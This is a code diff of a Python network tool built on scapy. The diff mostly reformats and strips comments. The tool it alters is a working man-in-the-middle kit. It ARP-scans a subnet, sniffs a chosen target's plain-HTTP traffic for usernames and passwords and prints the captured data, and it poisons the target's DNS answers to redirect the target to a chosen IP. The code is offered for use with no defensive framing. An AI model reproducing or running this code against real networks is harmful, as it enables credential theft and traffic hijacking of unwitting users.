@@ -15,7 +15,7 @@ if platform.system() == "Windows":
     if not ctypes.windll.shell32.IsUserAnAdmin():
         print(f"{Fore.RED}This script requires Administrator privileges. Please run as Administrator.{Style.RESET_ALL}")
         exit(1)
-elif platform.system() == "Linux":  # [LINUX SUPPORT]
+elif platform.system() == "Linux":
     if os.geteuid() != 0:
         print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
         exit(1)
@@ -23,22 +23,14 @@ else:
     print(f"{Fore.RED}Unsupported OS: {platform.system()}{Style.RESET_ALL}")
     exit(1)
 
-
 parser = argparse.ArgumentParser(description='Device network sniffer')
-parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")',
-                    required=True)
+parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")', required=True)
 parser.add_argument('--iface', help='Network interface to use', required=True)
 parser.add_argument('--routerip', help='IP of your home router ', required=True)
 opts = parser.parse_args()
 
 def arp_scan(network, iface):
-    """
-    Performs ARP ping across the local subnet. Once a device responds, its IP
-    and MAC address will be recorded. MAC address lookup will also be performed
-    against the pre-defined OUI in https://standards-oui.ieee.org/oui/oui.txt.
-    """
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
-                 timeout=5, iface=iface, verbose=False)  # Disable verbose output for Windows
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=5, iface=iface, verbose=False)
     print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
     for i in ans:
         mac = i.answer[ARP].hwsrc
@@ -76,43 +68,42 @@ class Device:
 
     def arp_sniff(self):
         def arp_pkt_callback(pkt):
-            if pkt.haslayer(ARP) and pkt[ARP].op == 1:  # ARP request
+            if pkt.haslayer(ARP) and pkt[ARP].op == 1:
                 print(f'{Fore.YELLOW}ARP Sniff: {pkt[ARP].psrc} -> {pkt[ARP].pdst}{Style.RESET_ALL}')
         sniff(iface=self.iface, prn=arp_pkt_callback, filter=f'arp and host {self.targetip}', store=0)
 
     def http_sniff(self):
-    def http_pkt_callback(pkt):
-        if pkt.haslayer('Raw'):
-            raw_data = pkt['Raw'].load.decode('utf-8', errors='ignore')
-            lines = raw_data.split('\r\n')
-            host = ''
-            path = ''
-            creds_found = False
+        def http_pkt_callback(pkt):
+            if pkt.haslayer('Raw'):
+                raw_data = pkt['Raw'].load.decode('utf-8', errors='ignore')
+                lines = raw_data.split('\r\n')
+                host = ''
+                path = ''
+                creds_found = False
 
-            for line in lines:
-                if line.startswith("Host:"):
-                    host = line.split("Host:")[1].strip()
-                if line.startswith("GET") or line.startswith("POST"):
-                    path = line.split()[1]
-                if any(keyword in line.lower() for keyword in ["username", "user", "email", "password", "passwd", "login"]):
-                    creds_found = True
+                for line in lines:
+                    if line.startswith("Host:"):
+                        host = line.split("Host:")[1].strip()
+                    if line.startswith("GET") or line.startswith("POST"):
+                        path = line.split()[1]
+                    if any(keyword in line.lower() for keyword in ["username", "user", "email", "password", "passwd", "login"]):
+                        creds_found = True
 
-            if host and path and not creds_found:
-                print(f'{Fore.CYAN}Visited Page: http://{host}{path}{Style.RESET_ALL}')
-            elif creds_found:
-                print(f'{Fore.RED}Possible Credentials Detected:{Style.RESET_ALL}\n{Fore.YELLOW}{raw_data}{Style.RESET_ALL}')
+                if host and path and not creds_found:
+                    print(f'{Fore.CYAN}Visited Page: http://{host}{path}{Style.RESET_ALL}')
+                elif creds_found:
+                    print(f'{Fore.RED}Possible Credentials Detected:{Style.RESET_ALL}\n{Fore.YELLOW}{raw_data}{Style.RESET_ALL}')
 
-    sniff(iface=self.iface, prn=http_pkt_callback, filter=f'tcp port 80 and host {self.targetip}', store=0)
-
+        sniff(iface=self.iface, prn=http_pkt_callback, filter=f'tcp port 80 and host {self.targetip}', store=0)
 
     def dns_poison(self, spoof_ip):
         def dns_pkt_callback(pkt):
-            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
+            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                 spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                               UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                               DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
-                send(spoofed_pkt, iface=self.iface, verbose=False)  # Disable verbose output for Windows
+                send(spoofed_pkt, iface=self.iface, verbose=False)
                 print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
         sniff(iface=self.iface, prn=dns_pkt_callback, filter=f'udp port 53 and host {self.targetip}', store=0)
 
